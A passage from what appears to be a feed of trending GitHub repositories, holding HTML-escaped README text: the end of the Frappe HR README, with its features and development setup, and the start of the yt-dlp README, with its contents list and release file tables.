 &lt;li&gt;&lt;strong&gt;Frappe HR Mobile App&lt;/strong&gt;: Apply for and approve leaves on the go, check-in and check-out, access employee profile right from the mobile app.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;details open&gt; 
 &lt;summary&gt;View Screenshots&lt;/summary&gt; 
 &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/hrms-appraisal.png" /&gt; 
 &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/hrms-requisition.png" /&gt; 
 &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/hrms-attendance.png" /&gt; 
 &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/hrms-salary.png" /&gt; 
 &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/hrms-pwa.png" /&gt; 
&lt;/details&gt; 
&lt;h3&gt;Under the Hood&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/frappe/frappe"&gt;&lt;strong&gt;Frappe Framework&lt;/strong&gt;&lt;/a&gt;: A full-stack web application framework written in Python and Javascript. The framework provides a robust foundation for building web applications, including a database abstraction layer, user authentication, and a REST API.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/frappe/frappe-ui"&gt;&lt;strong&gt;Frappe UI&lt;/strong&gt;&lt;/a&gt;: A Vue-based UI library, to provide a modern user interface. The Frappe UI library provides a variety of components that can be used to build single-page applications on top of the Frappe Framework.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Production Setup&lt;/h2&gt; 
&lt;h3&gt;Managed Hosting&lt;/h3&gt; 
&lt;p&gt;You can try &lt;a href="https://frappecloud.com"&gt;Frappe Cloud&lt;/a&gt;, a simple, user-friendly and sophisticated &lt;a href="https://github.com/frappe/press"&gt;open-source&lt;/a&gt; platform to host Frappe applications with peace of mind.&lt;/p&gt; 
&lt;p&gt;It takes care of installation, setup, upgrades, monitoring, maintenance and support of your Frappe deployments. It is a fully featured developer platform with an ability to manage and control multiple Frappe deployments.&lt;/p&gt; 
&lt;div&gt; 
 &lt;a href="https://frappecloud.com/hrms/signup" target="_blank"&gt; 
  &lt;picture&gt; 
   &lt;source media="(prefers-color-scheme: dark)" srcset="https://frappe.io/files/try-on-fc-white.png" /&gt; 
   &lt;img src="https://frappe.io/files/try-on-fc-black.png" alt="Try on Frappe Cloud" height="28" /&gt; 
  &lt;/picture&gt; &lt;/a&gt; 
&lt;/div&gt; 
&lt;h2&gt;Development setup&lt;/h2&gt; 
&lt;h3&gt;Docker&lt;/h3&gt; 
&lt;p&gt;You need Docker, docker-compose and git setup on your machine. Refer &lt;a href="https://docs.docker.com/"&gt;Docker documentation&lt;/a&gt;. After that, run the following commands:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;git clone https://github.com/frappe/hrms
cd hrms/docker
docker-compose up
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Wait for some time until the setup script creates a site. After that you can access &lt;code&gt;http://localhost:8000&lt;/code&gt; in your browser and the login screen for HR should show up.&lt;/p&gt; 
&lt;p&gt;Use the following credentials to log in:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Username: &lt;code&gt;Administrator&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Password: &lt;code&gt;admin&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Local&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;Set up bench by following the &lt;a href="https://frappeframework.com/docs/user/en/installation"&gt;Installation Steps&lt;/a&gt; and start the server and keep it running &lt;pre&gt;&lt;code class="language-sh"&gt;$ bench start
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt;In a separate terminal window, run the following commands &lt;pre&gt;&lt;code class="language-sh"&gt;$ bench new-site hrms.localhost
$ bench get-app erpnext
$ bench get-app hrms
$ bench --site hrms.localhost install-app hrms
$ bench --site hrms.localhost add-to-hosts
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt;You can access the site at &lt;code&gt;http://hrms.localhost:8080&lt;/code&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Learning and Community&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;a href="https://frappe.school"&gt;Frappe School&lt;/a&gt; - Learn Frappe Framework and ERPNext from the various courses by the maintainers or from the community.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://docs.frappe.io/hr"&gt;Documentation&lt;/a&gt; - Extensive documentation for Frappe HR.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://discuss.erpnext.com/"&gt;User Forum&lt;/a&gt; - Engage with the community of ERPNext users and service providers.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://t.me/frappehr"&gt;Telegram Group&lt;/a&gt; - Get instant help from the community of users.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;a href="https://github.com/frappe/erpnext/wiki/Issue-Guidelines"&gt;Issue Guidelines&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://erpnext.com/security"&gt;Report Security Vulnerabilities&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/frappe/erpnext/wiki/Contribution-Guidelines"&gt;Pull Request Requirements&lt;/a&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Logo and Trademark Policy&lt;/h2&gt; 
&lt;p&gt;Please read our &lt;a href="https://raw.githubusercontent.com/frappe/hrms/develop/TRADEMARK_POLICY.md"&gt;Logo and Trademark Policy&lt;/a&gt;.&lt;/p&gt; 
&lt;br /&gt; 
&lt;br /&gt; 
&lt;div align="center" style="padding-top: 0.75rem;"&gt; 
 &lt;a href="https://frappe.io" target="_blank"&gt; 
  &lt;picture&gt; 
   &lt;source media="(prefers-color-scheme: dark)" srcset="https://frappe.io/files/Frappe-white.png" /&gt; 
   &lt;img src="https://frappe.io/files/Frappe-black.png" alt="Frappe Technologies" height="28" /&gt; 
  &lt;/picture&gt; &lt;/a&gt; 
&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>yt-dlp/yt-dlp</title>
      <link>https://github.com/yt-dlp/yt-dlp</link>
      <description>&lt;p&gt;A feature-rich command-line audio/video downloader&lt;/p&gt;&lt;hr&gt;&lt;div align="center"&gt; 
 &lt;p&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#readme"&gt;&lt;img src="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/.github/banner.svg?sanitize=true" alt="YT-DLP" /&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#installation" title="Installation"&gt;&lt;img src="https://img.shields.io/github/v/release/yt-dlp/yt-dlp?color=brightgreen&amp;amp;label=Download&amp;amp;style=for-the-badge" alt="Release version" /&gt;&lt;/a&gt; &lt;a href="https://pypi.org/project/yt-dlp" title="PyPI"&gt;&lt;img src="https://img.shields.io/badge/-PyPI-blue.svg?logo=pypi&amp;amp;labelColor=555555&amp;amp;style=for-the-badge" alt="PyPI" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/Maintainers.md#maintainers" title="Donate"&gt;&lt;img src="https://img.shields.io/badge/_-Donate-red.svg?logo=githubsponsors&amp;amp;labelColor=555555&amp;amp;style=for-the-badge" alt="Donate" /&gt;&lt;/a&gt; &lt;a href="https://discord.gg/H5MNcFW63r" title="Discord"&gt;&lt;img src="https://img.shields.io/discord/807245652072857610?color=blue&amp;amp;labelColor=555555&amp;amp;label=&amp;amp;logo=discord&amp;amp;style=for-the-badge" alt="Discord" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/supportedsites.md" title="Supported Sites"&gt;&lt;img src="https://img.shields.io/badge/-Supported_Sites-brightgreen.svg?style=for-the-badge" alt="Supported Sites" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/LICENSE" title="License"&gt;&lt;img src="https://img.shields.io/badge/-Unlicense-blue.svg?style=for-the-badge" alt="License: Unlicense" /&gt;&lt;/a&gt; &lt;a href="https://github.com/yt-dlp/yt-dlp/actions" title="CI Status"&gt;&lt;img src="https://img.shields.io/github/actions/workflow/status/yt-dlp/yt-dlp/core.yml?branch=master&amp;amp;label=Tests&amp;amp;style=for-the-badge" alt="CI Status" /&gt;&lt;/a&gt; &lt;a href="https://github.com/yt-dlp/yt-dlp/commits" title="Commit History"&gt;&lt;img src="https://img.shields.io/github/commit-activity/m/yt-dlp/yt-dlp?label=commits&amp;amp;style=for-the-badge" alt="Commits" /&gt;&lt;/a&gt; &lt;a href="https://github.com/yt-dlp/yt-dlp/pulse/monthly" title="Last activity"&gt;&lt;img src="https://img.shields.io/github/last-commit/yt-dlp/yt-dlp/master?label=&amp;amp;style=for-the-badge&amp;amp;display_timestamp=committer" alt="Last Commit" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;!-- MANPAGE: END EXCLUDED SECTION --&gt; 
&lt;p&gt;yt-dlp is a feature-rich command-line audio/video downloader with support for &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/supportedsites.md"&gt;thousands of sites&lt;/a&gt;. The project is a fork of &lt;a href="https://github.com/ytdl-org/youtube-dl"&gt;youtube-dl&lt;/a&gt; based on the now inactive &lt;a href="https://github.com/blackjack4494/yt-dlc"&gt;youtube-dlc&lt;/a&gt;.&lt;/p&gt; 
&lt;!-- MANPAGE: MOVE "USAGE AND OPTIONS" SECTION HERE --&gt; 
&lt;!-- MANPAGE: BEGIN EXCLUDED SECTION --&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#installation"&gt;INSTALLATION&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/wiki/Installation"&gt;Detailed instructions&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#release-files"&gt;Release Files&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#update"&gt;Update&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#dependencies"&gt;Dependencies&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#compile"&gt;Compile&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#usage-and-options"&gt;USAGE AND OPTIONS&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#general-options"&gt;General Options&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#network-options"&gt;Network Options&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#geo-restriction"&gt;Geo-restriction&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#video-selection"&gt;Video Selection&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#download-options"&gt;Download Options&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#filesystem-options"&gt;Filesystem Options&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#thumbnail-options"&gt;Thumbnail Options&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#internet-shortcut-options"&gt;Internet Shortcut Options&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#verbosity-and-simulation-options"&gt;Verbosity and Simulation Options&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#workarounds"&gt;Workarounds&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#video-format-options"&gt;Video Format Options&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#subtitle-options"&gt;Subtitle Options&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#authentication-options"&gt;Authentication Options&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#post-processing-options"&gt;Post-processing Options&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#sponsorblock-options"&gt;SponsorBlock Options&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#extractor-options"&gt;Extractor Options&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#preset-aliases"&gt;Preset Aliases&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#configuration"&gt;CONFIGURATION&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#configuration-file-encoding"&gt;Configuration file encoding&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#authentication-with-netrc"&gt;Authentication with netrc&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#notes-about-environment-variables"&gt;Notes about environment variables&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#output-template"&gt;OUTPUT TEMPLATE&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#output-template-examples"&gt;Output template examples&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#format-selection"&gt;FORMAT SELECTION&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#filtering-formats"&gt;Filtering Formats&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#sorting-formats"&gt;Sorting Formats&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#format-selection-examples"&gt;Format Selection examples&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#modifying-metadata"&gt;MODIFYING METADATA&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#modifying-metadata-examples"&gt;Modifying metadata examples&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#extractor-arguments"&gt;EXTRACTOR ARGUMENTS&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#plugins"&gt;PLUGINS&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#installing-plugins"&gt;Installing Plugins&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#developing-plugins"&gt;Developing Plugins&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#embedding-yt-dlp"&gt;EMBEDDING YT-DLP&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#embedding-examples"&gt;Embedding examples&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#changes-from-youtube-dl"&gt;CHANGES FROM YOUTUBE-DL&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#new-features"&gt;New features&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#differences-in-default-behavior"&gt;Differences in default behavior&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#deprecated-options"&gt;Deprecated options&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/CONTRIBUTING.md#contributing-to-yt-dlp"&gt;CONTRIBUTING&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/CONTRIBUTING.md#opening-an-issue"&gt;Opening an Issue&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/CONTRIBUTING.md#developer-instructions"&gt;Developer Instructions&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/wiki"&gt;WIKI&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/wiki/FAQ"&gt;FAQ&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- MANPAGE: END EXCLUDED SECTION --&gt; 
&lt;h1&gt;INSTALLATION&lt;/h1&gt; 
&lt;!-- MANPAGE: BEGIN EXCLUDED SECTION --&gt; 
&lt;p&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe"&gt;&lt;img src="https://img.shields.io/badge/-Windows_x64-blue.svg?style=for-the-badge&amp;amp;logo=windows" alt="Windows" /&gt;&lt;/a&gt; &lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp"&gt;&lt;img src="https://img.shields.io/badge/-Linux/BSD-red.svg?style=for-the-badge&amp;amp;logo=linux" alt="Unix" /&gt;&lt;/a&gt; &lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_macos"&gt;&lt;img src="https://img.shields.io/badge/-MacOS-lightblue.svg?style=for-the-badge&amp;amp;logo=apple" alt="MacOS" /&gt;&lt;/a&gt; &lt;a href="https://pypi.org/project/yt-dlp"&gt;&lt;img src="https://img.shields.io/badge/-PyPI-blue.svg?logo=pypi&amp;amp;labelColor=555555&amp;amp;style=for-the-badge" alt="PyPI" /&gt;&lt;/a&gt; &lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.tar.gz"&gt;&lt;img src="https://img.shields.io/badge/-Source_tar-green.svg?style=for-the-badge" alt="Source Tarball" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#release-files"&gt;&lt;img src="https://img.shields.io/badge/-Other-grey.svg?style=for-the-badge" alt="Other variants" /&gt;&lt;/a&gt; &lt;a href="https://github.com/yt-dlp/yt-dlp/releases"&gt;&lt;img src="https://img.shields.io/badge/-All_Versions-lightgrey.svg?style=for-the-badge" alt="All versions" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;!-- MANPAGE: END EXCLUDED SECTION --&gt; 
&lt;p&gt;You can install yt-dlp using &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#release-files"&gt;the binaries&lt;/a&gt;, &lt;a href="https://pypi.org/project/yt-dlp"&gt;pip&lt;/a&gt; or one using a third-party package manager. See &lt;a href="https://github.com/yt-dlp/yt-dlp/wiki/Installation"&gt;the wiki&lt;/a&gt; for detailed instructions&lt;/p&gt; 
&lt;!-- MANPAGE: BEGIN EXCLUDED SECTION --&gt; 
&lt;h2&gt;RELEASE FILES&lt;/h2&gt; 
&lt;h4&gt;Recommended&lt;/h4&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="left"&gt;File&lt;/th&gt; 
   &lt;th align="left"&gt;Description&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp"&gt;yt-dlp&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Platform-independent &lt;a href="https://docs.python.org/3/library/zipimport.html"&gt;zipimport&lt;/a&gt; binary. Needs Python (recommended for &lt;strong&gt;Linux/BSD&lt;/strong&gt;)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe"&gt;yt-dlp.exe&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Windows (Win8+) standalone x64 binary (recommended for &lt;strong&gt;Windows&lt;/strong&gt;)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_macos"&gt;yt-dlp_macos&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Universal MacOS (10.15+) standalone executable (recommended for &lt;strong&gt;MacOS&lt;/strong&gt;)&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h4&gt;Alternatives&lt;/h4&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="left"&gt;File&lt;/th&gt; 
   &lt;th align="left"&gt;Description&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_linux"&gt;yt-dlp_linux&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Linux (glibc 2.17+) standalone x86_64 binary&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_linux.zip"&gt;yt-dlp_linux.zip&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Unpackaged Linux (glibc 2.17+) x86_64 executable (no auto-update)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_linux_aarch64"&gt;yt-dlp_linux_aarch64&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Linux (glibc 2.17+) standalone aarch64 binary&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_linux_aarch64.zip"&gt;yt-dlp_linux_aarch64.zip&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Unpackaged Linux (glibc 2.17+) aarch64 executable (no auto-update)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_linux_armv7l.zip"&gt;yt-dlp_linux_armv7l.zip&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Unpackaged Linux (glibc 2.31+) armv7l executable (no auto-update)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_musllinux"&gt;yt-dlp_musllinux&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Linux (musl 1.2+) standalone x86_64 binary&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_musllinux.zip"&gt;yt-dlp_musllinux.zip&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Unpackaged Linux (musl 1.2+) x86_64 executable (no auto-update)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_musllinux_aarch64"&gt;yt-dlp_musllinux_aarch64&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Linux (musl 1.2+) standalone aarch64 binary&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_musllinux_aarch64.zip"&gt;yt-dlp_musllinux_aarch64.zip&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Unpackaged Linux (musl 1.2+) aarch64 executable (no auto-update)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_x86.exe"&gt;yt-dlp_x86.exe&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Windows (Win8+) standalone x86 (32-bit) binary&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_win_x86.zip"&gt;yt-dlp_win_x86.zip&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Unpackaged Windows (Win8+) x86 (32-bit) executable (no auto-update)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_arm64.exe"&gt;yt-dlp_arm64.exe&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Windows (Win10+) standalone ARM64 binary&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_win_arm64.zip"&gt;yt-dlp_win_arm64.zip&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Unpackaged Windows (Win10+) ARM64 executable (no auto-update)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_win.zip"&gt;yt-dlp_win.zip&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Unpackaged Windows (Win8+) x64 executable (no auto-update)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_macos.zip"&gt;yt-dlp_macos.zip&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;Unpackaged MacOS (10.15+) executable (no auto-update)&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h4&gt;Misc&lt;/h4&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="left"&gt;File&lt;/th&gt; 
   &lt;th align="left"&gt;Description&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
